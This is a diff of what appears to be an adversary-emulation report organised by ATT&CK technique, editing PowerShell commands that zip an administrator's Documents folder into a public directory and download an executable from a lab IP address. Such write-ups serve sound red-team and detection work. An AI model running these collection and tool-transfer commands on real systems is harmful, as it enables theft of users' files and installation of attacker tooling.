@@ -257,7 +257,7 @@ reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion
 ### T1560 — Archive Collected Data
 
 ```powershell
-7z a -tzip C:\Users\Public\data.zip C:\Users\Administrator\Documents\*
+"C:\Program Files\7-Zip\7z.exe" a -tzip C:\Users\Public\data.zip C:\Users\Administrator\Documents\*
 ```
 
 **Evidence:**
@@ -271,8 +271,7 @@ reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion
 ### T1105 — Ingress Tool Transfer
 
 ```powershell
-Invoke-WebRequest -Uri "http://192.168.10.102:8080/tool.exe" `
-  -OutFile "C:\Users\Public\tool.exe"
+Invoke-WebRequest -Uri "http://192.168.10.102:8080/apt29-tool.exe" -OutFile "C:\Users\Public\apt29-tool.exe"
 ```
 
 **Evidence:**
